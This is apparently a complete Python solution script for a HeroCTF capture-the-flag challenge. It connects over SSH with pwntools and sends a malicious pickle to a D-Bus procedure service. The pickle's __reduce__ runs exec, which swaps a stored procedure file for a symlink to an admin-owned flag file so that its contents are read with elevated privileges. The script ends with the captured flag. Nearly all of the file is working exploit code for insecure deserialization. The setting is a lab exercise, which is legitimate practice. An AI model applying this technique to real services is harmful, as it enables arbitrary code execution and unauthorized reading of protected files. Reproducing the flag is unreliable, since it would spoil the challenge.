import base64
import pickle

from pwn import *


class X:
    def __reduce__(self):
        return exec, (
            """
import os, glob
f = glob.glob("/var/procedures/*_x.pkl")[0]
os.unlink(f); os.symlink("/home/admin/flag.txt", f)
print("print(open('/home/admin/flag.txt').read())")
""",
        )


io = ssh(host="dyn03.heroctf.fr", port=12571, user="user", password="password")

p = base64.b64encode(pickle.dumps(X())).decode()
print(
    io.run(
        [
            "python3",
            "-c",
            f"""
import dbus
s = dbus.SystemBus().get_object("com.system.ProcedureService", "/com/system/ProcedureService")
i = dbus.Interface(s, "com.system.ProcedureService")
i.RegisterProcedure("x", "{p}")
print(i.ExecuteProcedure("x"))
""",
        ]
    )
    .recvall()
    .decode()
)

io.close()

# Hero{Yu0_f0rG3d_y0uR_oWn_p47H_4pPr3nT1cE}
